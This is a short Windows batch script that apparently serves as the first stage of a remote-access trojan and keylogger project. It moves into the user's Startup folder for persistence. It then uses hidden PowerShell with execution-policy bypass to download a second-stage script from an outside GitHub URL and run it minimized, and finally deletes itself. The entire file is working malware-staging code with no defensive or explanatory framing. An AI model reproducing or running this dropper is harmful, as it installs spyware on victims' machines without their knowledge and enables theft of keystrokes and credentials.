@echo off

@REM Detect current path
set INITIAL=%cd%

@REM download payloads from your server and run
set STARTUP="C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd %STARTUP% 

@REM run stage2
powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/key_logger/important_file/wget.cmd' -OutFile 'wget.cmd'"
start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass .\wget.cmd

@REM back to last path
cd %INITIAL%

del initial.cmd


